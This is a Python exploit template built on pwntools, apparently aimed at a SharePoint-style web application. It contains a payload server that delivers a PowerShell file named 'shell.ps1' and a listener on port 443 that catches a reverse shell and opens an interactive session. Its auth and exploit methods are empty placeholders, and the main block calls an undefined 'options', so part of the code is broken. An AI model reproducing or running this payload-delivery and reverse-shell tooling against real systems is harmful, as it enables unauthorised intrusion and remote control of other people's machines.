#!/usr/bin/python
import requests, logging, SocketServer, json
from pwn import *
from pwnlib.context import Thread as ServerThread
from bs4 import BeautifulSoup
from SimpleHTTPServer import SimpleHTTPRequestHandler
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests, SocketServer, argparse
from urllib import quote, unquote
from pwn import *
from sys import argv, exit

context.log_level = 'info'


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, req, client_addr, server):
        # self.payload = server.payload
        self.server = server
        SimpleHTTPRequestHandler.__init__(self, req, client_addr, server)

    def do_GET(self):
        log.debug('received connection')
        response = open(self.server.payload, 'rb').read() \
            if self.server.payload != '' else ''
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)

    def do_POST(self):
        log.debug('received connection')
        response = open(self.server.payload, 'rb').read() \
            if self.server.payload != '' else ''
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)


class Server(SocketServer.TCPServer):
    def __init__(self, payload, ip_address='0.0.0.0', port=80):
        self.payload = payload
        SocketServer.TCPServer.__init__(self, (ip_address, port), Handler)

    def start_limited(self):
        self.handle_request()
        return self

    def start(self):
        self.serve_forever()
        return self


class Exploit:
    def __init__(
            self,
            redirect=False,
            proxy_address='',
            ip_address=''
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.session = requests.session()
        self.redirect = redirect
        self.ip_address = ip_address
        self.timeout = 0.5
        self.threads = {}
        self.shell = None
        self.server = None
        self.proxies = {
            'http': 'http://%s' % proxy_address,
            'https': 'http://%s' % proxy_address
        } \
            if proxy_address is not None \
               and proxy_address != '' else {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'RequestVerificationToken': '',
        }
        self.query_params = {
            'PickerDialogType': ''
        }
        self.form_values = {
            '__REQUESTDIGEST': '',
            '__EVENTTARGET': '',
            '__EVENTARGUMENT': '',
            '__VIEWSTATE': '',
            '__VIEWSTATEGENERATOR': '',
            '__CALLBACKID': '',
            '__CALLBACKPARAM': '',
            '__EVENTVALIDATION': '',
            '__RequestVerificationToken': '',
        }
        self.cookies = {}

    def do_get(self, url, params={}, data={}):
        log.debug('executing get request')
        return self.session.get(
            url=url,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            data=data,
            params=params
        )
        # self.session.get().elapsed.total_seconds()

    def do_post(self, url, data={}, params={}):
        log.debug('executing post request')
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            params=params
        )

    # self.session.get().elapsed.total_seconds()

    def to_json(self, resp):
        text = resp.text
        json_obj = json.loads(text.encode('ascii'))
        # log.debug('json object value %s' % json_obj['value'])
        return json_obj

    def parse_page(self, content):
        log.debug('parsing page form')
        soup = BeautifulSoup(content, 'lxml')
        for key, val in self.form_values.iteritems():
            for tag in soup.select('input[name=%s]' % key):
                try:
                    self.form_values[key] = tag['value']
                except Exception as error:
                    log.debug('error for key %s error %s' % (key, str(error)))
        return self

    def debug(self):
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def exploit(self):
        log.info('exploiting target')
        # place holder
        # place holder
        return self

    def auth(self):
        log.info('authenticating with target')
        # place holder
        # place holder
        return self

    def start_server(self, payload, port=80):
        log.info('starting payload server')
        self.server = Server(payload=payload, ip_address=self.ip_address, port=port)
        self.threads[payload] = ServerThread(target=self.server.start_limited, args=())
        self.threads[payload].start()
        return self

    def listen(self, port=443):
        log.info('starting listener')
        self.shell = listen(port)
        return self

    def interact(self):
        log.info('waiting for connection..')
        time.sleep(self.timeout)
        self.shell.wait_for_connection().interactive()
        for thread in self.threads.keys():
            log.info('closing threads')
            self.threads[thread].join()

if __name__ == '__main__':
    try:

        solution = Exploit(
            ip_address='192.168.1.1',
            proxy_address='10.9.8.1',
        ) \
            .listen(port=443) \
            .start_server(
                payload='shell.ps1',
                port=80
            )

        if options.debug():
            solution.debug()

        solution \
            .auth() \
            .exploit() \
            .interact()
    except Exception as error:
        log.debug('error in main: %s' % str(error))
